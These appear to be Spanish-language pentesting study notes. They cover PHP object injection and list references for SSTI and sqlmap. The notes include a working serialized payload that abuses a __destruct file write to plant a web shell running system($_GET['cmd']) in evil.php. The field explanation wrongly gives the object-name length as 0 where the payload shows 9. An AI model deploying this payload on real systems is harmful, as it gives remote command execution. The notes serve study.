# Server-Side Template Injection

TODO

# PHP Object Injection

## Código

```php
class foobarzoo {
    public $csv="entries.csv";
    public $line=null;
    
    function __destruct() {
        file_put_contents($this->csv,$this->line);
    }
}
```

## Payload de explotación

`data=O:9:"foobarzoo":2:{s:3:"csv";s:8:"evil.php";s:4:"line";s:28:"<?php system($_GET["cmd"])?>";}`

Donde en `O:9:"foobarzoo":2:`:
- `O` &rarr; tipo de dato (objeto).
- `0` &rarr; longitud dato.
- `2` &rarr; cantidad de propiedades.

Donde en `s:3:"csv";s:8:"evil.php"`:
- `s` &rarr; tipo de dato (string).
- `3` &rarr; longitud dato.
- `csv` &rarr; nombre de propiedad.
- `evil.php` &rarr; valor de propiedad.


## Referencias

- https://insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf
- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/
- https://security.stackexchange.com/questions/176263/why-does-this-php-object-injection-exploit-work
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/628481cd4d9c9f7db980a6a92c446d22c26a4aad/Insecure%20Deserialization/PHP.md

# SQL

## sqlmap

https://teckk2.github.io/web-pentesting/2018/02/07/SQL-Injection-(Login-Form-User).html